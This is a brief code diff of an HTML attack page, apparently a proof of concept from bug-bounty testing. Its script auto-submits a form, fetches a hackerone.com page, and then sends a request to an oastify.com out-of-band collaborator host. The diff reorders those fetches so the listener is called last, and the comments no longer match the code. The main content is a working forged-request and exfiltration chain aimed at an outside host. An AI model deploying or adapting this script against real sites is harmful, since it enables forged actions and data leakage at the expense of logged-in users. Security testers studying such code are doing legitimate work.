@@ -7,12 +7,12 @@
     <script>
       history.pushState('', '', '/');
       document.forms[0].submit();
-      fetch('https://rrm2bmlpxo1pxlpcbu0548va71ds1ppe.oastify.com')  // Make a request to site1.com
+      fetch('https://hackerone.com/stories-of-2024/new')  // Make a request to site1.com
   .then(response => response.json())  // Assuming the response is JSON
   .then(data => {
     // Once the response from site1.com is received, make another fetch call to site2.com
-    return fetch('https://hackerone.com/stories-of-2024/new', {
-      method: 'POST',  // or GET depending on what you need
+    return fetch('https://rrm2bmlpxo1pxlpcbu0548va71ds1ppe.oastify.com', {
+      method: 'GET',  // or GET depending on what you need
       headers: {
         'Content-Type': 'application/json'
       },
